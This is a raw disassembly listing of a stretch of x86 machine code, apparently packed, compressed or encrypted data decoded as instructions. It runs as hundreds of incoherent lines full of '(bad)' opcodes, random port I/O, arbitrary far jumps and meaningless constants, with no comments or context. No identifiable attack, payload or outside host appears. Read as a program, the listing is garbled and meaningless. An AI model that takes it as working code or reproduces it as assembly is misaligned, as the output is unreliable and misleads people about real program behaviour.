  41b507:	repnz and eax,0xa1f6670b
  41b50d:	cli    
  41b50e:	(bad)
	...
  41b572:	add    BYTE PTR [eax],al
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	iret   
  41b581:	dec    edx
  41b582:	xchg   ebp,eax
  41b583:	cmp    esp,DWORD PTR [edi+0x22]
  41b586:	add    DWORD PTR [eax],eax
  41b588:	add    eax,0x52000001
  41b58d:	ins    BYTE PTR es:[edi],dx
  41b58e:	inc    ebp
  41b58f:	pop    edi
  41b590:	jnp    0x41b552
  41b592:	mov    edx,0x18bff402
  41b597:	dec    ebx
  41b598:	retf   0x6c61
  41b59b:	int    0xea
  41b59d:	sub    al,0x59
  41b59f:	jmp    0x97d2e59f
  41b5a4:	aaa    
  41b5a5:	xor    BYTE PTR [edx-0x3c],0x2a
  41b5a9:	test   eax,0x4060fe15
  41b5ae:	add    BYTE PTR [esi+0x3c2619e3],bh
  41b5b4:	push   ecx
  41b5b5:	mov    esi,DWORD PTR [ecx+0x24]
  41b5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5b9:	dec    ebx
  41b5ba:	and    dl,ch
  41b5bc:	ret    
  41b5bd:	cmp    DWORD PTR [edi],esi
  41b5bf:	mov    eax,ds:0xe6b09222
  41b5c4:	mov    al,0xa5
  41b5c6:	out    0xbb,al
  41b5c8:	out    dx,eax
  41b5c9:	imul   ecx,esp,0xffffff8b
  41b5cc:	xchg   esp,eax
  41b5cd:	mov    WORD PTR [esi-0x2025e68e],ds
  41b5d3:	mov    cs,ebx
  41b5d5:	cmc    
  41b5d6:	mov    esp,0xcf19c021
  41b5db:	sahf   
  41b5dc:	mov    eax,ds:0x6d484ff9
  41b5e1:	mov    al,ds:0x69643071
  41b5e6:	cmp    BYTE PTR [edi],ah
  41b5e8:	out    0x3c,eax
  41b5ea:	jno    0x41b5da
  41b5ec:	fidiv  WORD PTR [edi-0x11795e4d]
  41b5f2:	imul   esi,esi,0x6e310647
  41b5f8:	dec    eax
  41b5f9:	dec    eax
  41b5fa:	les    eax,FWORD PTR [ebp-0x775267dc]
  41b600:	push   ss
  41b601:	inc    ebx
  41b602:	inc    edi
  41b603:	stos   DWORD PTR es:[edi],eax
  41b604:	frstor [ebp-0x55]
  41b607:	pop    ss
  41b608:	cmp    eax,0x93014132
  41b60d:	out    dx,al
  41b60e:	mov    eax,0xa4b9f2d
  41b613:	dec    esp
  41b614:	inc    ebx
  41b615:	xchg   esi,eax
  41b616:	xor    edi,ecx
  41b618:	lahf   
  41b619:	icebp  
  41b61a:	std    
  41b61b:	inc    edi
  41b61c:	adc    DWORD PTR [eax-0x68144464],ebp
  41b622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b623:	inc    esi
  41b624:	mov    ebx,0x2da0d433
  41b629:	dec    ecx
  41b62a:	cmp    BYTE PTR [edx+0x51ed2ee7],0xee
  41b631:	scas   al,BYTE PTR es:[edi]
  41b632:	or     edi,DWORD PTR [ebx+0x6e075d7d]
  41b638:	cli    
  41b639:	jge    0x41b629
  41b63b:	sahf   
  41b63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b63d:	xchg   ebx,esi
  41b63f:	pop    esi
  41b640:	js     0x41b617
  41b642:	inc    ecx
  41b643:	into   
  41b644:	jnp    0x41b645
  41b646:	mov    esp,0x920536a8
  41b64b:	popa   
  41b64c:	jmp    0x82d8:0x88f84351
  41b653:	out    0x16,al
  41b655:	xlat   BYTE PTR ds:[ebx]
  41b656:	fld    DWORD PTR [eax*1-0x67f79e63]
  41b65d:	jae    0x41b6ae
  41b65f:	mov    ch,0x1f
  41b661:	sub    ebp,DWORD PTR [edx]
  41b663:	inc    edx
  41b664:	stos   DWORD PTR es:[edi],eax
  41b665:	and    DWORD PTR [ecx+0x62],ecx
  41b668:	(bad)  
  41b669:	push   ss
  41b66a:	dec    ebp
  41b66b:	pusha  
  41b66c:	lahf   
  41b66d:	in     eax,0x84
  41b66f:	sbb    ebx,ebp
  41b671:	cmp    eax,0x81c6e41e
  41b676:	lods   eax,DWORD PTR ds:[esi]
  41b677:	gs add eax,0x9c4a18ec
  41b67d:	adc    BYTE PTR [edx-0x48],0xa5
  41b681:	aaa    
  41b682:	nop
  41b683:	nop
  41b684:	pop    edi
  41b685:	xchg   esp,eax
  41b686:	(bad)  
  41b687:	out    0x1a,al
  41b689:	test   eax,0x4ad6a075
  41b68e:	pop    eax
  41b68f:	mov    BYTE PTR [edi+0x0],dl
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	je     0x41b760
  41b702:	pusha  
  41b703:	adc    al,0x6c
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0x3d000001,al
  41b70d:	mov    bl,0x86
  41b70f:	push   edi
  41b710:	pop    ecx
  41b711:	sbb    eax,0x9aef156e
  41b716:	dec    edx
  41b717:	and    DWORD PTR [ecx+ecx*1],0x99414a03
  41b71e:	jnp    0x41b73a
  41b720:	fistp  WORD PTR [eax]
  41b722:	jb     0x41b787
  41b724:	sbb    al,0xa6
  41b726:	mov    ah,0x1c
  41b728:	aaa    
  41b729:	out    0x6,eax
  41b72b:	jo     0x41b6b1
  41b72d:	push   ebx
  41b72e:	inc    ebp
  41b72f:	or     al,0x32
  41b731:	or     edi,DWORD PTR [esi+0xf8c2ed0]
  41b737:	mov    ebx,0x5a2fcdd3
  41b73c:	push   ecx
  41b73d:	sbb    eax,0x8d1fd7ac
  41b742:	inc    edx
  41b743:	rcl    DWORD PTR [edx+ecx*2],cl
  41b746:	fmul   DWORD PTR [ebx+esi*4]
  41b749:	jmp    0x41b755
  41b74b:	std    
  41b74c:	jmp    0x903b:0xd63edbc3
  41b753:	stos   BYTE PTR es:[edi],al
  41b754:	inc    ecx
  41b755:	add    ebx,DWORD PTR [ecx+0x2390137d]
  41b75b:	xchg   edx,eax
  41b75c:	rcl    DWORD PTR [ebp+ebx*4-0x4eb8b9a9],0x80
  41b764:	neg    edx
  41b766:	xchg   BYTE PTR [ebx+0x51],bh
  41b769:	mov    ds:0x3bb792ea,eax
  41b76e:	retf   0x83c5
  41b771:	aad    0xa
  41b773:	jl     0x41b7d9
  41b775:	test   BYTE PTR [edi+0x54ed6c49],dh
  41b77b:	int3   
  41b77c:	cs or  ah,ah
  41b77f:	fs ins BYTE PTR es:[edi],dx
  41b781:	iret   
  41b782:	pop    edx
  41b783:	rcr    eax,cl
  41b785:	je     0x41b7f8
  41b787:	mov    al,BYTE PTR [esi+ebp*2+0x58]
  41b78b:	jne    0x41b7de
  41b78d:	xchg   edi,eax
  41b78e:	mov    bl,0xb0
  41b790:	push   ebx
  41b791:	scas   al,BYTE PTR es:[edi]
  41b792:	imul   ebx,DWORD PTR [ebx+0x71],0x65
  41b796:	jmp    FWORD PTR [eax+edx*8-0x77203877]
  41b79d:	loope  0x41b762
  41b79f:	pusha  
  41b7a0:	sub    ch,dl
  41b7a2:	imul   edi,DWORD PTR [edi-0x40],0x16
  41b7a6:	add    BYTE PTR [ecx-0x32],0x65
  41b7aa:	nop
  41b7ab:	ins    DWORD PTR es:[edi],dx
  41b7ac:	fdivr  QWORD PTR [eax]
  41b7ae:	in     eax,dx
  41b7af:	sub    DWORD PTR [ebx+eiz*1],eax
  41b7b2:	and    DWORD PTR [ecx+0x3194a9ca],ecx
  41b7b8:	fist   DWORD PTR [ebx]
  41b7ba:	loop   0x41b7ba
  41b7bc:	adc    BYTE PTR [edi],bh
  41b7be:	paddq  mm1,QWORD PTR [edi]
  41b7c1:	pop    edx
  41b7c2:	xchg   edi,eax
  41b7c3:	add    ch,BYTE PTR [eax-0x7]
  41b7c6:	dec    ecx
  41b7c7:	add    edi,esp
  41b7c9:	sub    ch,BYTE PTR [eax-0x35a7d97b]
  41b7cf:	js     0x41b834
  41b7d1:	cwde   
  41b7d2:	mov    esp,0x49a27d52
  41b7d7:	cdq    
  41b7d8:	outs   dx,BYTE PTR ds:[esi]
  41b7d9:	aaa    
  41b7da:	inc    ebx
  41b7db:	jns    0x41b7fa
  41b7dd:	rcr    DWORD PTR [ecx+0x16],1
  41b7e0:	adc    eax,0x336d6070
  41b7e5:	je     0x41b845
  41b7e7:	(bad)  
  41b7e8:	pop    es
  41b7e9:	jae    0x41b7a8
  41b7eb:	int3   
  41b7ec:	fdivr  QWORD PTR [ecx+0x31a3ce64]
  41b7f2:	ss pop es
  41b7f4:	adc    ebx,ebp
  41b7f6:	xchg   DWORD PTR [ebx-0x59],ecx
  41b7f9:	leave  
  41b7fa:	or     eax,0xd10e205c
  41b7ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b800:	loop   0x41b7d0
  41b802:	stos   DWORD PTR es:[edi],eax
  41b803:	mov    bh,0xf3
  41b805:	in     al,dx
  41b806:	xor    eax,0x78788c2d
  41b80b:	scas   al,BYTE PTR es:[edi]
  41b80c:	(bad)  
  41b80d:	pop    edi
  41b80e:	jge    0x41b7e0
  41b810:	add    BYTE PTR es:[eax],al
	...
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xc2
  41b881:	mov    eax,0x2471cfcd
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    eax,0x76000001
  41b88d:	shl    ebp,1
  41b88f:	mov    edx,0x5b36a87f
  41b894:	inc    esi
  41b895:	das    
  41b896:	dec    eax
  41b897:	pushf  
  41b898:	push   ebx
  41b899:	inc    edx
  41b89a:	retf   0x4f6d
  41b89d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b89e:	sbb    al,0x29
  41b8a0:	pop    ebp
  41b8a1:	jg     0x41b84c
  41b8a3:	xchg   edx,eax
  41b8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8a5:	(bad)  
  41b8a6:	fcmove st,st(4)
  41b8a8:	and    DWORD PTR [ecx-0x78],ecx
  41b8ab:	and    eax,eax
  41b8ad:	mov    ah,BYTE PTR [edi]
  41b8af:	jae    0x41b8a3
  41b8b1:	dec    esp
  41b8b2:	push   0xa4f55e63
  41b8b7:	(bad)  
  41b8b8:	lock mov eax,0x86fb7ecf
  41b8be:	cmp    BYTE PTR [esi+0x59f7fd09],ch
  41b8c4:	jg     0x41b8ca
  41b8c6:	xchg   edx,eax
  41b8c7:	bound  eax,QWORD PTR [ebx+0x5]
  41b8ca:	ins    BYTE PTR es:[edi],dx
  41b8cb:	adc    esp,DWORD PTR [edi]
  41b8cd:	scas   al,BYTE PTR es:[edi]
  41b8ce:	add    DWORD PTR [edx+eiz*8],edx
  41b8d1:	push   0x6f333c00
  41b8d6:	jmp    DWORD PTR [ecx]
  41b8d8:	mov    al,ds:0x92789ad
  41b8dd:	add    bh,BYTE PTR [bx+di]
  41b8e0:	jno    0x41b958
  41b8e2:	mov    bl,0xf8
  41b8e4:	sbb    edx,DWORD PTR ds:0xdad35c4c
  41b8ea:	(bad)  
  41b8eb:	fwait
  41b8ec:	test   al,0x5b
  41b8ee:	inc    esp
  41b8ef:	ret    
  41b8f0:	push   ss
  41b8f1:	rcr    BYTE PTR ds:0x2a862b1d,cl
  41b8f7:	xchg   ebp,esp
  41b8f9:	cmp    ch,ch
  41b8fb:	sbb    BYTE PTR [ebp+ecx*1+0x1a],bh
  41b8ff:	cmp    al,0x3a
  41b901:	inc    ebp
  41b902:	pushf  
  41b903:	leave  
  41b904:	sub    eax,0x587218f3
  41b909:	sub    DWORD PTR [ebx+0x30678562],edx
  41b90f:	test   BYTE PTR [ebx-0x11],dl
  41b912:	mov    WORD PTR [edx-0x6d],?
  41b915:	cdq    
  41b916:	leave  
  41b917:	mov    eax,0xe2cec304
  41b91c:	pop    eax
  41b91d:	mov    ch,0xd9
  41b91f:	lahf   
  41b920:	mov    ch,0x14
  41b922:	aam    0x3e
  41b924:	dec    DWORD PTR [edi+0x11]
  41b927:	(bad)  
  41b928:	lods   eax,DWORD PTR ds:[esi]
  41b929:	mov    ds,WORD PTR [esi+0x58baa63a]
  41b92f:	push   eax
  41b930:	mov    WORD PTR [esp+edi*8+0xc],ds
  41b934:	or     al,0xfc
  41b936:	add    esp,edx
  41b938:	adc    DWORD PTR [edi+0x77c4734e],ebx
  41b93e:	mov    ds:0xf41e8d6c,al
  41b943:	sbb    ecx,DWORD PTR [edi]
  41b945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b946:	mov    ch,0xf
  41b948:	and    eax,ebp
  41b94a:	in     eax,dx
  41b94b:	popf   
  41b94c:	xor    ecx,DWORD PTR [edx]
  41b94e:	inc    eax
  41b94f:	dec    edi
  41b950:	int    0x78
  41b952:	jnp    0x41b8e0
  41b954:	loopne 0x41b954
  41b956:	(bad)  
  41b957:	dec    ecx
  41b958:	xchg   esi,eax
  41b959:	or     esi,DWORD PTR [esi-0x17]
  41b95c:	mov    ebx,0x42aedc3a
  41b961:	mov    BYTE PTR [ebp+ebp*8+0x5d],ch
  41b965:	sbb    eax,0x7e408e14
  41b96a:	lahf   
  41b96b:	jnp    0x41b955
  41b96d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b96e:	mov    esp,0x77a48714
  41b973:	in     al,dx
  41b974:	mov    ecx,DWORD PTR [edi-0x7c174152]
  41b97a:	scas   eax,DWORD PTR es:[edi]
  41b97b:	jae    0x41b95a
  41b97d:	xchg   esi,eax
  41b97e:	jne    0x41b99b
  41b980:	dec    ebp
  41b981:	inc    esi
  41b982:	inc    esp
  41b983:	jae    0x41b98d
  41b985:	(bad)  
  41b986:	ret    
  41b987:	in     al,dx
  41b988:	sbb    eax,0xfa687656
  41b98d:	(bad)  
  41b98e:	out    dx,al
  41b98f:	pop    es
  41b990:	sahf   
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	js     0x41ba67
  41ba02:	jne    0x41b9d0
  41ba04:	jbe    0x41ba2b
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    eax,0x8a000001
  41ba0d:	(bad)  
  41ba0e:	pop    eax
  41ba0f:	data16 jle 0x41ba13
  41ba12:	jo     0x41ba52
  41ba14:	sub    bh,BYTE PTR [edx+edx*4+0x52]
  41ba18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba19:	mov    ecx,eax
  41ba1b:	inc    esi
  41ba1c:	push   edi
  41ba1d:	adc    al,0x6b
  41ba1f:	ins    BYTE PTR es:[edi],dx
  41ba20:	cmp    eax,0xcc658543
  41ba25:	jl     0x41ba9f
  41ba27:	(bad)  
  41ba28:	daa    
  41ba29:	sbb    eax,0xa6951c48
  41ba2e:	sbb    ch,bl
  41ba30:	xchg   DWORD PTR [esi],esi
  41ba32:	or     cl,BYTE PTR [edi-0x2]
  41ba35:	iret   
  41ba36:	icebp  
  41ba37:	aaa    
  41ba38:	mov    BYTE PTR [ebx],ah
  41ba3a:	cmp    DWORD PTR [ebx],eax
  41ba3c:	iret   
  41ba3d:	out    0x99,al
  41ba3f:	jmp    0x41ba8d
  41ba41:	loopne 0x41b9db
  41ba43:	pop    edi
  41ba44:	ret    
  41ba45:	xchg   edi,eax
  41ba46:	out    dx,al
  41ba47:	out    dx,al
  41ba48:	(bad)  
  41ba49:	ins    DWORD PTR es:[edi],dx
  41ba4a:	loopne 0x41baae
  41ba4c:	out    dx,eax
  41ba4d:	test   BYTE PTR [edx],bh
  41ba4f:	sub    dl,ch
  41ba51:	mov    WORD PTR ds:0xc1ec04c3,gs
  41ba57:	xor    edi,DWORD PTR [edx-0x494bf01d]
  41ba5d:	lahf   
  41ba5e:	popf   
  41ba5f:	xchg   ebx,eax
  41ba60:	mov    ?,WORD PTR [esi-0x53]
  41ba63:	inc    ebx
  41ba64:	lea    edx,[eax]
  41ba66:	test   al,0xf4
  41ba68:	inc    ebx
  41ba69:	stos   BYTE PTR es:[edi],al
  41ba6a:	in     al,dx
  41ba6b:	adc    DWORD PTR [ecx+ebx*1-0x4203d120],ebx
  41ba72:	je     0x41ba83
  41ba74:	sti    
  41ba75:	les    edx,FWORD PTR [edx+0x21fd51bd]
  41ba7b:	clc    
  41ba7c:	in     al,dx
  41ba7d:	retf   0x9103
  41ba80:	dec    edx
  41ba81:	stc    
  41ba82:	and    BYTE PTR [edi+0x20e0d38f],ah
  41ba88:	pop    es
  41ba89:	jge    0x41bae8
  41ba8b:	jge    0x41bae6
  41ba8d:	pushf  
  41ba8e:	int    0xaf
  41ba90:	push   ecx
  41ba91:	push   ebx
  41ba92:	icebp  
  41ba93:	scas   eax,DWORD PTR es:[edi]
  41ba94:	idiv   BYTE PTR [ebp+ebx*2+0x35]
  41ba98:	lahf   
  41ba99:	stc    
  41ba9a:	lock mov ah,0x49
  41ba9d:	pop    ebx
  41ba9e:	mov    ah,0x7b
  41baa0:	xchg   edx,eax
  41baa1:	sub    eax,edx
  41baa3:	ret    0x796d
  41baa6:	pop    ebp
  41baa7:	cmp    dl,al
  41baa9:	or     dh,BYTE PTR [edi-0x13]
  41baac:	add    eax,0x397e7a18
  41bab1:	add    eax,DWORD PTR [edx-0x70ee2c15]
  41bab7:	mov    al,0xa1
  41bab9:	pop    ecx
  41baba:	out    dx,eax
  41babb:	int    0x47
  41babd:	jae    0x41bab5
  41babf:	sub    bl,BYTE PTR [esi+0x27409520]
  41bac5:	sub    al,0xe
  41bac7:	jbe    0x41ba83
  41bac9:	sub    edi,DWORD PTR [ebx+0x2166e200]
  41bacf:	mov    ecx,0x9f7f41cf
  41bad4:	cmp    edi,DWORD PTR [ecx]
  41bad6:	mov    esi,0xb5f58d42
  41badb:	retf   
  41badc:	inc    ebx
  41badd:	push   esi
  41bade:	inc    edx
  41badf:	mov    ch,0xf9
  41bae1:	ins    BYTE PTR es:[edi],dx
  41bae2:	retf   
  41bae3:	stos   BYTE PTR es:[edi],al
  41bae4:	push   0xffffffd2
  41bae6:	popf   
  41bae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bae8:	xchg   edx,eax
  41bae9:	in     al,0x16
  41baeb:	ja     0x41bb01
  41baed:	mov    ah,0x46
  41baef:	out    dx,eax
  41baf0:	and    BYTE PTR [edi+0x15],ah
  41baf3:	adc    DWORD PTR [edx+0x15fc2f4e],esp
  41baf9:	lods   eax,DWORD PTR ds:[esi]
  41bafa:	mov    ds:0x4b07f2b2,eax
  41baff:	and    bh,BYTE PTR [ebx-0x64]
  41bb02:	out    dx,eax
  41bb03:	sub    dl,bl
  41bb05:	fistp  QWORD PTR [esi+0x1]
  41bb08:	nop
  41bb09:	icebp  
  41bb0a:	and    al,0x60
  41bb0c:	add    al,0x96
  41bb0e:	add    bh,BYTE PTR [esi+0xea]
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x71],cx
  41bb81:	pusha  
  41bb82:	dec    ecx
  41bb83:	das    
  41bb84:	jnp    0x41bbac
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0x9e000001
  41bb8d:	inc    edx
  41bb8e:	in     eax,0xf4
  41bb90:	pop    edi
  41bb91:	add    DWORD PTR [ecx],eax
  41bb93:	aad    0x36
  41bb95:	or     al,BYTE PTR ds:0x29240e0
  41bb9b:	mov    ch,0x95
  41bb9d:	hlt    
  41bb9e:	pushf  
  41bb9f:	xchg   ebp,eax
  41bba0:	adc    eax,0x36f5e57a
  41bba5:	pop    ebp
  41bba6:	aaa    
  41bba7:	hlt    
  41bba8:	inc    ebp
  41bba9:	retf   0xc400
  41bbac:	call   0x573df3b
  41bbb1:	rcr    BYTE PTR [ebp-0x5c],cl
  41bbb4:	inc    ebp
  41bbb5:	je     0x41bb93
  41bbb7:	cmc    
  41bbb8:	sbb    bh,bl
  41bbba:	test   eax,0x3cff93db
  41bbbf:	mov    edx,0x1b25ace0
  41bbc4:	loop   0x41bc1b
  41bbc6:	daa    
  41bbc7:	push   esi
  41bbc8:	and    BYTE PTR [edx],dl
  41bbca:	fsub   st,st(2)
  41bbcc:	push   edi
  41bbcd:	sbb    dl,cl
  41bbcf:	retf   0x81f6
  41bbd2:	jbe    0x41bc39
  41bbd4:	je     0x41bb5f
  41bbd6:	aaa    
  41bbd7:	arpl   ax,cx
  41bbd9:	mov    ds:0x274a583e,eax
  41bbde:	push   edx
  41bbdf:	fnstsw WORD PTR [esp+esi*4-0x702be523]
  41bbe6:	push   ebp
  41bbe7:	mov    al,ds:0x529291f0
  41bbec:	enter  0x3ed1,0xb5
  41bbf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf1:	test   DWORD PTR [edx+ecx*4+0x69],eax
  41bbf5:	mov    cs,WORD PTR [edi+0x5c3d6d9a]
  41bbfb:	enter  0x1650,0x25
  41bbff:	(bad)  
  41bc01:	jb     0x41bc11
  41bc03:	dec    eax
  41bc04:	enter  0x7f23,0xc
  41bc08:	push   esp
  41bc09:	jl     0x41bbbb
  41bc0b:	stos   BYTE PTR es:[edi],al
  41bc0c:	mov    ebx,0xf8db241f
  41bc11:	sbb    BYTE PTR [ebx-0x76da8635],bh
  41bc17:	mov    dl,bl
  41bc19:	dec    edi
  41bc1a:	jmp    0x1b6f:0x1de7d055
  41bc21:	lods   al,BYTE PTR ds:[esi]
  41bc22:	pop    edx
  41bc23:	push   ebp
  41bc24:	add    al,0x5a
  41bc26:	(bad)  
  41bc27:	stc    
  41bc28:	xchg   ecx,eax
  41bc29:	test   DWORD PTR [edi+0x1e],eax
  41bc2c:	stc    
  41bc2d:	mov    edi,0xc96929d6
  41bc32:	xor    BYTE PTR [edx-0x56],0x73
  41bc36:	pop    esp
  41bc37:	jmp    edx
  41bc39:	rcr    BYTE PTR cs:[edx+0x7d],1
  41bc3d:	mov    BYTE PTR [eax+0x1],bh
  41bc40:	sar    BYTE PTR [esi],1
  41bc42:	ror    BYTE PTR [ebx-0x5e38748],1
  41bc48:	aaa    
  41bc49:	(bad)  
  41bc4a:	adc    bl,BYTE PTR [esi+edi*2]
  41bc4d:	pop    esp
  41bc4e:	out    dx,eax
  41bc4f:	and    DWORD PTR [esi+0x318864d9],ebx
  41bc55:	sbb    al,0x8f
  41bc57:	jns    0x41bc75
  41bc59:	mov    DWORD PTR [edx+0x133b3357],edi
  41bc5f:	dec    ecx
  41bc60:	mov    cl,0x48
  41bc62:	xchg   DWORD PTR [ebx],edi
  41bc64:	shl    DWORD PTR [edi],1
  41bc66:	inc    esp
  41bc67:	xor    DWORD PTR [ebp+0x11],esi
  41bc6a:	in     al,dx
  41bc6b:	lods   eax,DWORD PTR ds:[esi]
  41bc6c:	adc    ch,BYTE PTR [ebx]
  41bc6e:	es xchg esp,eax
  41bc70:	xchg   ebx,eax
  41bc72:	xor    bl,ch
  41bc74:	cli    
  41bc75:	mov    bh,0xf9
  41bc77:	and    eax,0x4ffb64b
  41bc7c:	ds clc 
  41bc7e:	cmp    DWORD PTR [edx-0x8],ebx
  41bc81:	je     0x41bcf4
  41bc83:	mov    esi,0x257a51dc
  41bc88:	jnp    0x41bcf7
  41bc8a:	popa   
  41bc8b:	pop    eax
  41bc8c:	(bad)  
  41bc8f:	jge    0x41bc26
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x40d4d9d8
  41bd02:	daa    
  41bd03:	loop   0x41bc85
  41bd05:	daa    
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    eax,0x4c000001
  41bd0d:	xchg   ebx,eax
  41bd0e:	outs   dx,BYTE PTR ds:[esi]
  41bd0f:	outs   dx,BYTE PTR ds:[esi]
  41bd10:	push   eax
  41bd11:	repz adc DWORD PTR [ebx],edx
  41bd14:	setne  cl
  41bd17:	or     al,BYTE PTR [edi+0x13d7d979]
  41bd1d:	sub    ecx,ebx
  41bd1f:	and    DWORD PTR [ecx],esp
  41bd21:	push   0x1d5c63b0
  41bd26:	retf   
  41bd27:	stos   DWORD PTR es:[edi],eax
  41bd28:	push   ds
  41bd29:	and    ecx,DWORD PTR [ecx+eiz*1+0x9149365]
  41bd30:	jle    0x41bdaf
  41bd32:	jnp    0x41bd72
  41bd34:	jl     0x41bd34
  41bd36:	cmp    BYTE PTR [edi],bl
  41bd38:	xchg   ebx,eax
  41bd39:	adc    DWORD PTR [eax+ebp*1+0x4e2f710a],ebx
  41bd40:	add    al,0xe2
  41bd42:	jnp    0x41bda5
  41bd44:	inc    BYTE PTR [ecx+edi*1+0x77]
  41bd48:	test   al,0x86
  41bd4a:	sub    ebx,DWORD PTR [ebp+ebx*8+0x54cbabff]
  41bd51:	mov    edx,0xdc22a543
  41bd56:	cli    
  41bd57:	adc    bl,cl
  41bd59:	imul   ebx,DWORD PTR [esi],0x78be7e7f
  41bd5f:	stos   BYTE PTR es:[edi],al
  41bd60:	mov    esi,0x1603a20b
  41bd65:	sti    
  41bd66:	test   dh,bl
  41bd68:	and    BYTE PTR [ecx+0x71],al
  41bd6b:	and    DWORD PTR [ecx+0x5f],0xbf41638e
  41bd72:	adc    BYTE PTR [edx],cl
  41bd74:	retf   
  41bd75:	ss push esi
  41bd77:	(bad)  
  41bd78:	bound  ebx,QWORD PTR [esi+0x4df80368]
  41bd7e:	call   0xb208:0x77284ba1
  41bd85:	push   0xd6d5015c
  41bd8a:	sub    bh,BYTE PTR [ecx-0x72a4a182]
  41bd90:	sbb    DWORD PTR [eax],0x7d
  41bd93:	fadd   QWORD PTR [edi-0x33]
  41bd96:	mov    bl,0x70
  41bd98:	cmp    al,0x38
  41bd9a:	inc    esi
  41bd9b:	mov    bh,al
  41bd9d:	std    
  41bd9e:	pop    ebp
  41bd9f:	jmp    0x41bdb5
  41bda1:	inc    eax
  41bda2:	mov    eax,ds:0x9be9ea90
  41bda7:	std    
  41bda8:	add    BYTE PTR [ebx+edi*8-0x51],dl
  41bdac:	idiv   BYTE PTR [ebx]
  41bdae:	sub    al,0x58
  41bdb0:	add    edx,DWORD PTR [ecx-0x47d33f70]
  41bdb6:	add    al,0x49
  41bdb8:	jmp    0x41bdc0
  41bdba:	jle    0x41bdd3
  41bdbc:	fcomp  QWORD PTR [ecx+0x6affa263]
  41bdc2:	mov    esp,0x804f9d6e
  41bdc7:	xchg   ebx,eax
  41bdc8:	and    ecx,DWORD PTR [esi-0x11470a94]
  41bdce:	leave  
  41bdcf:	stc    
  41bdd0:	inc    ecx
  41bdd1:	test   al,0xb3
  41bdd3:	ins    DWORD PTR es:[edi],dx
  41bdd4:	adc    ebx,DWORD PTR [esi]
  41bdd6:	fs inc ecx
  41bdd8:	xor    ebp,0xb4b1e9ac
  41bdde:	stc    
  41bddf:	in     al,0xba
  41bde1:	pop    esi
  41bde2:	std    
  41bde3:	repnz imul esp,DWORD PTR [eax+ecx*2],0xc53163dc
  41bdeb:	dec    eax
  41bdec:	jg     0x41bda8
  41bdee:	jge    0x41be45
  41bdf0:	mov    ah,0x72
  41bdf2:	and    ah,bh
  41bdf4:	push   0xffffff83
  41bdf6:	std    
  41bdf7:	popf   
  41bdf8:	imul   edx,DWORD PTR [ecx],0xbf649bbb
  41bdfe:	imul   esp,DWORD PTR [ebx+edi*1-0x3e],0xffffff8c
  41be03:	scas   eax,DWORD PTR es:[edi]
  41be04:	lods   eax,DWORD PTR ds:[esi]
  41be05:	mov    ss,WORD PTR [esi-0x54]
  41be08:	hlt    
  41be09:	push   ds
  41be0a:	jnp    0x41be46
  41be0c:	and    ah,cl
  41be0e:	in     al,dx
  41be0f:	jns    0x41be64
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx+0x50c63f66]
  41be82:	ret    0x85d0
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR ds:0xc8000001,al
  41be8d:	inc    ebp
  41be8e:	adc    al,0xa3
  41be90:	mov    ds,WORD PTR [edx+ebp*2+0x29]
  41be94:	enter  0xfeda,0x9b
  41be98:	pop    ds
  41be99:	scas   eax,DWORD PTR es:[edi]
  41be9a:	lea    ebp,[ebx+edx*2-0x5c]
  41be9e:	cwde   
  41be9f:	cmp    ah,bl
  41bea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bea2:	leave  
  41bea3:	out    0x95,eax
  41bea5:	sub    eax,0x6393a6f1
  41beaa:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41beac:	imul   ebx,esi,0xffffff83
  41beaf:	xor    BYTE PTR [esi+esi*8+0x15e03f50],ah
  41beb6:	std    
  41beb7:	(bad)  
  41beb8:	test   BYTE PTR [esi+0x7b],0xdf
  41bebc:	inc    eax
  41bebd:	jb     0x41becf
  41bebf:	xlat   BYTE PTR ds:[ebx]
  41bec0:	or     eax,0xc2d69bdf
  41bec5:	push   ebp
  41bec6:	repnz nop
  41bec8:	iret   
  41bec9:	mov    dl,0xc3
